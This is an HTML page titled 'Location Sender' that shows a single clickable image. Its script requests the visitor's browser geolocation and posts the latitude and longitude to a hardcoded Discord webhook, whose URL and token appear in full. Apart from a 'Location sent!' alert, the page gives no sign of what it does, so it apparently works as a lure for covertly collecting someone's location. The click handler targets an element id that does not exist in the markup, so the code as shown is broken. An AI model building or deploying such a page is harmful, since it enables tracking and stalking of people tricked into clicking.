<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Location Sender</title>
  <style>
    body {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background: #111;
    }
    img {
      width: 350px;
      cursor: pointer;
      border-radius: 10px;
      border: 3px solid #444;
    }
  </style>
</head>
<body>

<!-- Image the user clicks -->
<image src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSY08n4emzdxnuOttVPxLfZ4KDPASIYTm3LEw&s"></image>
<script>
const WEBHOOK_URL = "https://discord.com/api/webhooks/1446188896311312405/49dOB-xll_sFmjdnwQ-Woeq69nQyeIyXubit9b4tYKfUcpzTtfcXmzsGdhN4b168-4kU";

document.getElementById("sendLocation").addEventListener("click", () => {
    if (!navigator.geolocation) {
        alert("Geolocation is not supported.");
        return;
    }

    // Ask for permission
    navigator.geolocation.getCurrentPosition(success, error);
});

function success(position) {
    const data = {
        content: `üìç **New Location Shared**  
Latitude: ${position.coords.latitude}  
Longitude: ${position.coords.longitude}`
    };

    fetch(WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
    });

    alert("Location sent!");
}

function error() {
    alert("Location access denied.");
}
</script>

</body>
</html>
